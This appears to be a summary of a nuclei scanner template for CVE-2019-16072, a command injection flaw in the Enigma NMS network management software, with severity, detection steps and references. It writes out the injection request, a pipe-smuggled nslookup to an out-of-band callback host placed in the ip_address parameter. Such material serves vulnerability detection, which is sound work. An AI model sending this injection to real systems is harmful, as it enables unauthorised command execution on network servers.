---
cve_id: CVE-2019-16072
template_path: nuclei-templates/http/cves/2019/CVE-2019-16072.yaml
affected_product: Enigma NMS
severity: critical
authentication: required
external_callback: true
affected_versions: <= 65.0.0
preconditions: []
poc_classification: rce
---

## Vulnerability
Authenticated OS command injection (CWE-78) in NETSAS Enigma NMS `discover_and_manage.cgi` script (snmp_browser action). Attacker-controlled `ip_address` parameter fails to neutralize shell metacharacters, enabling arbitrary OS command execution.  
CVSS 3.1: 9.8 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H).  
Impact: full remote code execution and system compromise.

## PoC / Detection
Classification: rce  
Template first sends unauthenticated GET `/cgi-bin/protected/main.cgi` (internal matcher: contains "ENIGMA NMS"). Then issues authenticated Basic-Auth GET `/cgi-bin/protected/discover_and_manage.cgi?action=snmp_browser&ip_address=|nslookup+{{interactsh-url}}&...` to inject command. Success when response body contains "snmp" or status 200 **and** DNS interaction recorded via interactsh.

## References
- https://www.exploit-db.com/exploits/47202
- https://nvd.nist.gov/vuln/detail/CVE-2019-16072
- https://web.archive.org/web/20201220124431/https://www.mogozobo.com/?p=3647
